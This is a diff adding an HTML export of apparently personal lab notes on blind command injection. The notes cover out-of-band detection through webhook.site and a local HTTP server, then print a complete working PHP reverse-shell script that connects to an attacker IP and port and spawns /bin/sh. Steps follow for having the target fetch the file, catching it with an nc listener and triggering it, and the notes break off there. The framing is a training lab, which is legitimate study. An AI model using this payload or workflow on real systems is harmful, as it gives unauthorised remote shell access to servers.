@@ -1,0 +1,848 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Command Injection 0x02</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="8d1d0bf2-7b0b-466e-9eb1-0da711fe50af" class="page sans"><header><h1 class="page-title">Command Injection 0x02</h1><p class="page-description"></p></header><div class="page-body"><p id="065eed6b-e10a-4481-a973-66ac9614c330" class="">
+</p><p id="9a554218-89c5-4042-ae25-71b35d86e2b7" class="">This lab consists of blind command injection.</p><p id="217720d0-dba0-4905-9ccc-fcffe5d24608" class="">
+</p><p id="95b13119-b193-4a6e-8791-5dc4e26be7dd" class="">As it is blind command injection we need to use <strong>out of band technique for that navigate to </strong><a href="http://webhook.site"><strong>webhook.site</strong></a><strong> </strong></p><p id="f04f6570-0867-4b41-9daf-f2e551e478d3" class="">
+</p><figure id="8de50c0d-9a2a-414e-876e-e3df88354208" class="image"><a href="Command%20Injection%200x02%208d1d0bf27b0b466e9eb10da711fe50af/Untitled.png"><img style="width:1527px" src="Command%20Injection%200x02%208d1d0bf27b0b466e9eb10da711fe50af/Untitled.png"/></a></figure><p id="f68e3ed0-e0a6-4aa0-9af4-866f833e8754" class="">
+</p><figure id="2195f42c-82d7-4bc7-b39b-1c77d48db17c" class="image"><a href="Command%20Injection%200x02%208d1d0bf27b0b466e9eb10da711fe50af/Untitled%201.png"><img style="width:1576px" src="Command%20Injection%200x02%208d1d0bf27b0b466e9eb10da711fe50af/Untitled%201.png"/></a></figure><p id="3ca1ffde-b6a8-426f-8e78-df34d8496ab1" class="">
+</p><p id="1143a68d-b892-4891-8676-13d23279215d" class=""><strong>Here we have command injection this is called out of band because we have to catch it and review the information from a different place.</strong></p><p id="5dfbb1e0-6c85-495f-9ef8-4d3478df8747" class="">
+</p><p id="a0662ae7-f44e-4e87-9e0c-493fc81f5bf7" class="">
+</p><hr id="70ad068a-5418-4b32-909a-4caddaa84c5e"/><p id="b587f65c-b188-4b1d-8d83-17b3500c7e32" class="">
+</p><p id="70532a6f-5774-4adc-a2ce-583b1fd45887" class="">Now I want to trigger a new line as the target operating system is Linux.</p><p id="62b88c29-847c-4bdb-b122-5962d44cc360" class="">
+</p><ul id="924c6bc3-ab48-4f2c-a2a2-c2f96bc32b29" class="bulleted-list"><li style="list-style-type:disc">start a python server : “ python3 -m http.sever 8080 “ </li></ul><p id="2adef04a-626f-4b08-ac40-72293721fb8f" class="">
+</p><figure id="a5b448dd-4ca1-4f03-a578-f9aa54b5ecdd" class="image"><a href="Command%20Injection%200x02%208d1d0bf27b0b466e9eb10da711fe50af/Untitled%202.png"><img style="width:1561px" src="Command%20Injection%200x02%208d1d0bf27b0b466e9eb10da711fe50af/Untitled%202.png"/></a></figure><p id="16a5c1be-e711-413e-87e5-c2d6d17a3c1d" class="">
+</p><p id="0488fe61-0bac-4eed-ba49-5bc427dc81b3" class="">Once we click on check targets we will some response in the python server.</p><p id="086c16e8-a364-44c2-a1c5-ee733a7bff2a" class="">The ip address is my kali machine’s ip address.</p><p id="9d97170e-e4a5-4790-ae68-a4a04a8de0fe" class="">
+</p><figure id="d1967b36-2496-4d4a-b551-38fab2f900a1" class="image"><a href="Command%20Injection%200x02%208d1d0bf27b0b466e9eb10da711fe50af/Untitled%203.png"><img style="width:992px" src="Command%20Injection%200x02%208d1d0bf27b0b466e9eb10da711fe50af/Untitled%203.png"/></a></figure><p id="1b1860b5-252b-448b-8319-708d2ba8f816" class="">
+</p><p id="808815e0-d1da-4924-ab82-7bdcbf5002c2" class="">
+</p><hr id="69049791-186f-4f98-81f7-ef4134d4b057"/><p id="0e3c0660-8cd6-4da8-8493-0cdcbcda6582" class="">
+</p><p id="95d2626a-8c24-4eaa-9610-e4200417777a" class="">Now we want to get reverse shell like the previous lab but in this case it is filtering out the “ ; “ so we cannot use payloads like we used earlier. Often the bash reverse shell also use quite alot of special characters. </p><p id="cabb0d61-c22f-4a1d-a1c2-3089c70ecc0c" class="">
+</p><p id="8409d44c-360f-437b-a06b-1fb60b79e9a9" class="">In this case all we need to do is upload a reverse shell and then trigger it.</p><p id="1cf997b4-e847-45d7-9305-6ed71233c418" class="">
+</p><p id="0f91adc9-7b4c-43ae-9708-2f55f5363238" class="">For that navigate to :</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="78283fbe-5581-440c-93ea-1cff2ae3ef9c" class="code"><code class="language-Bash">/usr/share/webshells/laudanum/php/php-reverse-shell.php .</code></pre><figure id="ff443062-2306-4f6f-9b92-dd5e318622ef" class="image"><a href="Command%20Injection%200x02%208d1d0bf27b0b466e9eb10da711fe50af/Untitled%204.png"><img style="width:1144px" src="Command%20Injection%200x02%208d1d0bf27b0b466e9eb10da711fe50af/Untitled%204.png"/></a></figure><p id="f037d020-b5c9-4518-ab31-198407a12a7a" class="">
+</p><p id="f8589c58-5ae3-49c2-972c-83cd800060d8" class="">Now modify the script we copied :</p><p id="4dc26615-fe30-45e1-a46a-55bc9b61ad21" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8a1c2bdc-28ac-4be3-923a-e40d2d7c6f24" class="code"><code class="language-Bash">&lt;?php
+set_time_limit (0);
+$VERSION = &quot;1.0&quot;;
+$ip = &#x27;192.168.124.157&#x27;;  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = &#x27;uname -a; w; id; /bin/sh -i&#x27;;
+$daemon = 0;
+$debug = 0;
+
+//
+// Daemonise ourself if possible to avoid zombies later
+//
+
+// pcntl_fork is hardly ever available, but will allow us to daemonise
+// our php process and avoid zombies.  Worth a try...
+if (function_exists(&#x27;pcntl_fork&#x27;)) {
+	// Fork and have the parent process exit
+	$pid = pcntl_fork();
+	
+	if ($pid == -1) {
+		printit(&quot;ERROR: Can&#x27;t fork&quot;);
+		exit(1);
+	}
+	
+	if ($pid) {
+		exit(0);  // Parent exits
+	}
+
+	// Make the current process a session leader
+	// Will only succeed if we forked
+	if (posix_setsid() == -1) {
+		printit(&quot;Error: Can&#x27;t setsid()&quot;);
+		exit(1);
+	}
+
+	$daemon = 1;
+} else {
+	printit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;);
+}
+
+// Change to a safe directory
+chdir(&quot;/&quot;);
+
+// Remove any umask we inherited
+umask(0);
+
+//
+// Do the reverse shell...
+//
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+	printit(&quot;$errstr ($errno)&quot;);
+	exit(1);
+}
+
+// Spawn shell process
+$descriptorspec = array(
+   0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  // stdin is a pipe that the child will read from
+   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  // stdout is a pipe that the child will write to
+   2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+	printit(&quot;ERROR: Can&#x27;t spawn shell&quot;);
+	exit(1);
+}
+
+// Set everything to non-blocking
+// Reason: Occsionally reads will block, even though stream_select tells us they won&#x27;t
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);
+
+while (1) {
+	// Check for end of TCP connection
+	if (feof($sock)) {
+		printit(&quot;ERROR: Shell connection terminated&quot;);
+		break;
+	}
+
+	// Check for end of STDOUT
+	if (feof($pipes[1])) {
+		printit(&quot;ERROR: Shell process terminated&quot;);
+		break;
+	}
+
+	// Wait until a command is end down $sock, or some
+	// command output is available on STDOUT or STDERR
+	$read_a = array($sock, $pipes[1], $pipes[2]);
+	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+	// If we can read from the TCP socket, send
+	// data to process&#x27;s STDIN
+	if (in_array($sock, $read_a)) {
+		if ($debug) printit(&quot;SOCK READ&quot;);
+		$input = fread($sock, $chunk_size);
+		if ($debug) printit(&quot;SOCK: $input&quot;);
+		fwrite($pipes[0], $input);
+	}
+
+	// If we can read from the process&#x27;s STDOUT
+	// send data down tcp connection
+	if (in_array($pipes[1], $read_a)) {
+		if ($debug) printit(&quot;STDOUT READ&quot;);
+		$input = fread($pipes[1], $chunk_size);
+		if ($debug) printit(&quot;STDOUT: $input&quot;);
+		fwrite($sock, $input);
+	}
+
+	// If we can read from the process&#x27;s STDERR
+	// send data down tcp connection
+	if (in_array($pipes[2], $read_a)) {
+		if ($debug) printit(&quot;STDERR READ&quot;);
+		$input = fread($pipes[2], $chunk_size);
+		if ($debug) printit(&quot;STDERR: $input&quot;);
+		fwrite($sock, $input);
+	}
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+// Like print, but does nothing if we&#x27;ve daemonised ourself
+// (I can&#x27;t figure out how to redirect STDOUT like a proper daemon)
+function printit ($string) {
+	if (!$daemon) {
+		print &quot;$string\n&quot;;
+	}
+}
+
+?&gt;</code></pre><p id="7ccc2888-68f7-46c0-bcaf-2ff654e4d2b1" class="">
+</p><p id="816dc4df-aabd-42b9-9f41-f9c9bc5e3a85" class="">You need to change the IP address and the port number.</p><p id="4d128a53-f146-445d-b70e-cab778d31a83" class="">
+</p><p id="338b3115-d24a-4819-86c0-781d4e7d8222" class="">Now the start the server from the /tmp folder also the change the name of the payload file to something like “ rev.php “ </p><p id="c9a88f68-1af4-4b38-8050-2d33f7691bad" class="">
+</p><figure id="452c57c8-9e28-4439-ad61-224733f6f695" class="image"><a href="Command%20Injection%200x02%208d1d0bf27b0b466e9eb10da711fe50af/Untitled%205.png"><img style="width:1576px" src="Command%20Injection%200x02%208d1d0bf27b0b466e9eb10da711fe50af/Untitled%205.png"/></a></figure><p id="3d56dadd-b5ae-463e-8af6-76859b7a74fe" class="">
+</p><figure id="b0a21d50-48d2-4842-a3d1-fc260f4ca922" class="image"><a href="Command%20Injection%200x02%208d1d0bf27b0b466e9eb10da711fe50af/Untitled%206.png"><img style="width:915px" src="Command%20Injection%200x02%208d1d0bf27b0b466e9eb10da711fe50af/Untitled%206.png"/></a></figure><p id="d55e433c-c7f4-4a56-b454-e41537d8fe98" class="">
+</p><p id="501c3899-fe64-4870-a5c6-795076b590ce" class="">it managed to grab the file.</p><p id="c0b21f6f-0ce7-441e-8273-711b9553e8e9" class="">now we need to start up nc listener.</p><figure id="1a628fae-d7cf-47e6-9572-cceae7c9f99d" class="image"><a href="Command%20Injection%200x02%208d1d0bf27b0b466e9eb10da711fe50af/Untitled%207.png"><img style="width:488px" src="Command%20Injection%200x02%208d1d0bf27b0b466e9eb10da711fe50af/Untitled%207.png"/></a></figure><p id="daba4de2-2200-4df7-9487-a9404dce45cd" class="">
+</p><figure id="fa6a69ca-44d3-4002-be22-7674b57c650c" class="image"><a href="Command%20Injection%200x02%208d1d0bf27b0b466e9eb10da711fe50af/Untitled%208.png"><img style="width:1725px" src="Command%20Injection%200x02%208d1d0bf27b0b466e9eb10da711fe50af/Untitled%208.png"/></a></figure><p id="ed1aee45-12af-4127-b8f8-e4bbf87d3065" class="">
+</p><p id="e93900a5-478c-4c43-8691-a92d68989bdc" class="">Try running it in the browse.</p><p id="3a905370-dc3d-4d4f-b8b4-10b637d7f08a" class="">
